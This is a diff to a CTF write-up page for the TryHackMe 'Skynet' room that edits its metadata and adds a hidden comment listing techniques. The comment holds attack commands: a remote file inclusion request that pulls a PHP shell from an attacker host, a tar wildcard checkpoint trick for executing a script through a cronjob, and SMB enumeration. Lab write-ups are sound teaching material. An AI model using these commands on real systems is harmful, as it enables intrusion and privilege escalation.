@@ -5,8 +5,8 @@ link: "https://tryhackme.com/room/skynet"
 parent: TryHackMe
 os: Linux
 difficulty: Easy
-tags: [Nmap, Feroxbuster]
-starred: true
+tags: [Smbclient, Enum4Linux, Tar]
+starred: false
 date: 2025-12-07
 toc: true
 toc_sticky: true
@@ -16,7 +16,7 @@ toc_icon: "crosshairs"
 # CTF Writeup: [{{ page.title }}]({{ page.machine_url }})
 {% include ctf-badges.html %}
 
-> **Machine:** [**{{ page.parent }}**]({{ page.link }}) |
+> **Link:** [**{{ page.parent }}**]({{ page.link }}) |
 > **OS:** {{ page.os }} |
 > **Difficulty:** {{ page.difficulty }} |
 > **Date:** {{ page.date }} |
@@ -447,9 +447,18 @@ $ cat /tmp/flag.txt
 
 
 ---
-<p style="text-align: center; text-shadow: 0 0 5px #8B0000;"> ⸸ 𝕬𝖘 𝖞𝖔𝖚 𝖜𝖎𝖑𝖑 𝖎𝖙, 𝖘𝖔 𝖎𝖙 𝖘𝖍𝖆𝖑𝖑 𝖇𝖊 ⸸ 𝕾3𝖅4𝕽 ⸸ </p>
+{% comment %}
 
-<!--- Other Configs --->
-<style>
-  .page__title { display: none; }
-</style>
+[Technique]: SMB Enumeration
+[Command]: enum4linux -a <IP>
+[Why]: dumps all available SMB info including shares and user list.
+
+[Technique]: Remote File Inclusion Request
+[Command]: curl "http://<IP>/cuppa/alerts/alertConfigField.php?urlConfig=http://<AttackerIP>/shell.php"
+[Why]: Triggers RFI vulnerability to execute remote PHP shell.
+
+[Technique]: Tar Wildcard Exploit
+[Command]: touch ./"--checkpoint=1" && touch ./"--checkpoint-action=exec=sh shell.sh"
+[Why]: Tricks a wildcard 'tar *' cronjob into executing a shell script as options.
+
+{% endcomment %}
